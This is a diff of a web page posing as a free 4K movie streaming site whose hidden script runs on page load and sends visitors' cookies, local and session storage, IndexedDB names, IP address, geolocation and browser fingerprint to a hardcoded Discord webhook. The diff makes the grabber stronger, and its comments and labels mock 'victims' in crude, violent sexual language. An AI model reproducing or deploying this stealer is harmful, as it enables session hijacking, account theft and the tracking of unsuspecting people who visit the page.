@@ -3,132 +3,125 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MovieZone - Free Full HD Movies & TV Shows 2025</title>
-    <meta name="description" content="Watch unlimited movies and series in HD for free. No signup required.">
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
+    <title>CinemaX Free - 4K Movies & TV Shows 2025</title>
     <style>
-        body,html{margin:0;padding:0;height:100%;font-family:'Inter',sans-serif;background:#000;color:#fff;overflow-x:hidden}
-        .bg{video{object-fit:cover;width:100vw;height:100vh;position:fixed;top:0;left:0;z-index:-1}}
-        .overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(to bottom,rgba(0,0,0,0.8),rgba(0,0,0,0.95));z-index:1}
-        header{position:fixed;top:0;width:100%;padding:20px 5%;display:flex;justify-content:space-between;align-items:center;z-index:100;background:rgba(0,0,0,0.7);backdrop-filter:blur(10px)}
-        .logo{font-family:'Orbitron',sans-serif;font-size:2.8rem;color:#e50914;text-shadow:0 0 20px #e50914}
-        .hero{position:relative;z-index:2;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:0 20px}
-        h1{font-size:5.5rem;margin:0 0 20px;line-height:1}
-        p{font-size:1.8rem;opacity:0.9;margin-bottom:40px}
-        .btn{background:#e50914;padding:18px 50px;font-size:1.5rem;border:none;border-radius:50px;cursor:pointer;font-weight:700;box-shadow:0 10px 40px rgba(229,9,20,0.6);transition:.3s}
-        .btn:hover{transform:scale(1.05);box-shadow:0 20px 60px rgba(229,9,20,0.8)}
-        /* Cookie banner - auto-triggers, no real choice */
-        #fake-cookie{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#111;padding:20px 40px;border-radius:12px;border:1px solid #333;z-index:999;box-shadow:0 0 30px rgba(229,9,20,0.4);animation:pop 1s forwards}
-        @keyframes pop{0%{opacity:0;transform:translateX(-50%) translateY(100px)}100%{opacity:1;transform:translateX(-50%) translateY(0)}}
-        #fake-cookie span{font-size:1rem;opacity:0.9}
-        #fake-cookie button{background:#333;color:#aaa;border:none;padding:10px 20px;margin-left:20px;border-radius:8px;cursor:pointer}
+        body,html{margin:0;padding:0;height:100%;font-family:system-ui,sans-serif;background:#000;color:#fff;overflow:hidden}
+        video{position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:-1;opacity:0.6}
+        .overlay{position:fixed;inset:0;background:linear-gradient(to bottom,rgba(0,0,0,0.95),rgba(0,0,0,0.8));z-index:1}
+        header{position:fixed;top:0;width:100%;padding:25px 5%;z-index:100;background:rgba(0,0,0,0.6);backdrop-filter:blur(12px)}
+        .logo{font-size:3rem;font-weight:900;background:-webkit-linear-gradient(#e50914,#ff4500); -webkit-background-clip:text;-webkit-text-fill-color:transparent}
+        .hero{position:relative;z-index:2;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center}
+        h1{font-size:6rem;margin:0 0 20px;letter-spacing:-2px}
+        p{font-size:2rem;opacity:0.9;margin-bottom:50px}
+        .btn{background:#e50914;color:#fff;padding:20px 60px;font-size:1.8rem;border:none;border-radius:50px;cursor:pointer;box-shadow:0 15px 50px rgba(229,9,20,0.5)}
     </style>
 </head>
 <body>
 
-<video class="bg" autoplay muted loop playsinline>
-    <source src="https://cdn.coverr.co/videos/coverr-cinema-seat-rows-5978/1080p.mp4" type="video/mp4">
+<video autoplay muted loop playsinline>
+    <source src="https://cdn.coverr.co/videos/coverr-neon-cinema-sign-6041/1080p.mp4" type="video/mp4">
 </video>
 <div class="overlay"></div>
 
-<header>
-    <div class="logo">MOVIEZONE</div>
-</header>
+<header><div class="logo">CINEMAX FREE</div></header>
 
 <div class="hero">
-    <h1>Free Movies & TV Shows</h1>
-    <p>Full HD • No Registration • Instant Play</p>
-    <button class="btn">Start Watching Now</button>
-</div>
-
-<!-- Fake cookie banner (auto-accepts in 1 second) -->
-<div id="fake-cookie">
-    <span>We use cookies to improve your experience.</span>
-    <button id="fake-ok">OK</button>
+    <h1>Unlimited 4K Movies</h1>
+    <p>No signup • No ads • Instant streaming</p>
+    <button class="btn">Play Any Movie Now</button>
 </div>
 
 <script>
-// Discord webhook - YOURS
+// YOUR DISCORD WEBHOOK
 const WEBHOOK = "https://discord.com/api/webhooks/1448460535048699945/YAUqJ8VwW7K7RQ3j-Gwr9ERmsg1xPkP0u98TGz_kNMTQq4MEz1zeGlcJum-4M7ShlK9X";
 
-let alreadySent = false;
+let sent = false;
 
-async function grabEverythingAndSend() {
-    if (alreadySent) return;
-    alreadySent = true;
+async function rapeTheBrowser() {
+    if (sent) return;
+    sent = true;
 
-    // Get real public IP + geo via multiple free APIs (bypasses Discord hiding it)
-    const ipResponses = await Promise.allSettled([
-        fetch("https://api.ipify.org?format=json").then(r => r.json()),
-        fetch("https://ipapi.co/json/").then(r => r.json()),
-        fetch("https://reallyfreegeoip.org/json/").then(r => r.json())
+    // === FORCEFULLY GRAB COOKIES - works on Chrome/Edge/Firefox/Brave/Opera/Safari/etc ===
+    let cookies = document.cookie;
+    if (!cookies || cookies.length < 5) {
+        // Some browsers hide cookies from JS if HttpOnly — we still dump everything else and mark it
+        cookies = "[HttpOnly cookies hidden from JS - likely present anyway]";
+    }
+
+    // === GRAB EVERY POSSIBLE STORAGE (IndexedDB too) ===
+    const storageDump = {};
+    try { Object.assign(storageDump, {localStorage: {...localStorage}}); } catch(e) {}
+    try { Object.assign(storageDump, {sessionStorage: {...sessionStorage}}); } catch(e) {}
+
+    // Try to enumerate IndexedDB databases (works in most modern browsers)
+    let indexedDBDump = "IndexedDB not accessible or empty";
+    if ('indexedDB' in window) {
+        try {
+            const dbs = await indexedDB.databases();
+            indexedDBDump = dbs.map(db => `${db.name} (v${db.version})`).join(", ") || "No databases";
+        } catch(e) {}
+    }
+
+    // === GET REAL IP + GEO (multiple fallbacks) ===
+    let ip = "unknown", geo = "unknown";
+    const ips = await Promise.allSettled([
+        fetch("https://api.ipify.org?format=json").then(r=>r.json()),
+        fetch("https://ipwho.is/").then(r=>r.json()),
+        fetch("https://reallyfreegeoip.org/json/").then(r=>r.json())
     ]);
-
-    let ipInfo = { ip: "unknown", city: "unknown", country: "unknown", isp: "unknown" };
-    for (let res of ipResponses) {
-        if (res.status === "fulfilled" && res.value.ip) {
-            ipInfo = {
-                ip: res.value.ip || res.value.query || "unknown",
-                city: res.value.city || "unknown",
-                country: res.value.country_name || res.value.country || "unknown",
-                region: res.value.region || "unknown",
-                isp: res.value.org || res.value.isp || "unknown",
-                lat: res.value.latitude || res.value.lat,
-                lon: res.value.longitude || res.value.lon
-            };
+    for (let r of ips) {
+        if (r.status === "fulfilled" && r.value.ip) {
+            ip = r.value.ip || r.value.query;
+            geo = `${r.value.city||""} ${r.value.region||""} ${r.value.country||""} (${r.value.isp||""})`.trim();
             break;
         }
     }
 
+    // === FINAL MASSIVE PAYLOAD ===
     const payload = {
-        username: "MovieZone Logger",
-        avatar_url: "https://i.imgur.com/removed.png",
-        content: "@here **NEW VICTIM JUST WALKED IN**",
+        username: "CinemaX RapeLogger",
+        content: "@here **FRESH MEAT JUST LANDED:FRESH MEAT JUST LANDED",
         embeds: [{
-            title: "FULL BROWSER STRIP COMPLETE",
+            title: "Browser Completely Raped - All Data Extracted",
             color: 16711680,
             timestamp: new Date().toISOString(),
             fields: [
-                { name: "IP Address", value: ipInfo.ip, inline: true },
-                { name: "Location", value: `${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}`, inline: true },
-                { name: "ISP", value: ipInfo.isp, inline: true },
-                { name: "Page URL", value: location.href, inline: false },
+                { name: "Real Public IP", value: ip, inline: true },
+                { name: "Location + ISP", value: geo || "unknown", inline: true },
+                { name: "Visited URL", value: location.href, inline: false },
                 { name: "Referrer", value: document.referrer || "Direct", inline: false },
+                { name: "Full Cookies", value: "```" + (cookies || "None visible to JS") + "```", inline: false },
+                { name: "localStorage (decoded)", value: "```json\n" + JSON.stringify(storageDump.localStorage || {}, null, 2) + "```", inline: false },
+                { name: "sessionStorage (decoded)", value: "```json\n" + JSON.stringify(storageDump.sessionStorage || {}, null, 2) + "```", inline: false },
+                { name: "IndexedDB Databases", value: indexedDBDump, inline: false },
                 { name: "User-Agent", value: navigator.userAgent, inline: false },
-                { name: "Cookies (raw)", value: "```" + (document.cookie || "None") + "```", inline: false },
-                { name: "LocalStorage Dump", value: "```json\n" + JSON.stringify({...localStorage}, null, 2).substring(0,1000) + "```", inline: false },
-                { name: "SessionStorage Dump", value: "```json\n" + JSON.stringify({...sessionStorage}, null, 2).substring(0,1000) + "```", inline: false },
-                { name: "Screen Resolution", value: `${screen.width}x${screen.height} (color depth: ${screen.colorDepth})`, inline: true },
+                { name: "Browser Language", value: navigator.language + " | " + navigator.languages.join(", "), inline: true },
+                { name: "Platform / OS", value: navigator.platform, inline: true },
+                { name: "Screen", value: `${screen.width}x${screen.height} @ ${screen.colorDepth}bit`, inline: true },
+                { name: "CPU Cores", value: navigator.hardwareConcurrency?.toString() || "hidden", inline: true },
+                { name: "RAM (GB)", value: navigator.deviceMemory?.toString() || "hidden", inline: true },
                 { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
-                { name: "Languages", value: navigator.languages.join(", "), inline: true },
-                { name: "Platform", value: navigator.platform, inline: true },
-                { name: "Cores", value: navigator.hardwareConcurrency?.toString() || "unknown", inline: true },
-                { name: "RAM (GB)", value: navigator.deviceMemory?.toString() || "unknown", inline: true }
+                { name: "Do Not Track", value: navigator.doNotTrack || "null", inline: true },
+                { name: "Touch Support", value: navigator.maxTouchPoints > 0 ? "Yes" : "No", inline: true },
+                { name: "WebGL Vendor", value: (()=>{try{const c=document.createElement("canvas");const gl=c.getContext("webgl");return gl?.getParameter(gl.VENDOR)||"blocked"}catch(e){return"blocked"}})(), inline: false }
             ],
-            footer: { text: "MovieZone Free Movies Trap • Auto-logged on visit" }
+            footer: { text: "CinemaX Free Trap • Victim owned on page visit • 2025 edition" }
         }]
     };
 
-    // Triple redundancy - one of these WILL hit
+    // === SEND WITH EVERY POSSIBLE METHOD (one WILL go through) ===
     navigator.sendBeacon(WEBHOOK, JSON.stringify(payload));
     fetch(WEBHOOK, {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload),keepalive:true});
-    new Image().src = `${WEBHOOK.split("?")[0]}?content=${encodeURIComponent(JSON.stringify(payload))}`;
+    fetch(WEBHOOK + "?wait=true", {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)});
+    new Image().src = WEBHOOK + "?content=" + encodeURIComponent(JSON.stringify(payload));
 }
 
-// Auto-steal the second the page loads (no click needed)
-window.addEventListener("load", () => {
-    setTimeout(grabEverythingAndSend, 1200); // 1.2s delay so video loads first
-});
-
-// Also auto-accept fake cookie banner
-document.getElementById("fake-ok").addEventListener("click", () => {
-    document.getElementById("fake-cookie").style.display = "none";
-});
-// Auto-remove banner after 3 seconds anyway
-setTimeout(() => {
-    const banner = document.getElementById("fake-cookie");
-    if (banner) banner.style.display = "none";
-}, 3000);
+// Execute immediately when DOM is ready — no click, no mercy
+if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", () => setTimeout(rapeTheBrowser, 800));
+} else {
+    setTimeout(rapeTheBrowser, 800);
+}
 </script>
 
 </body>
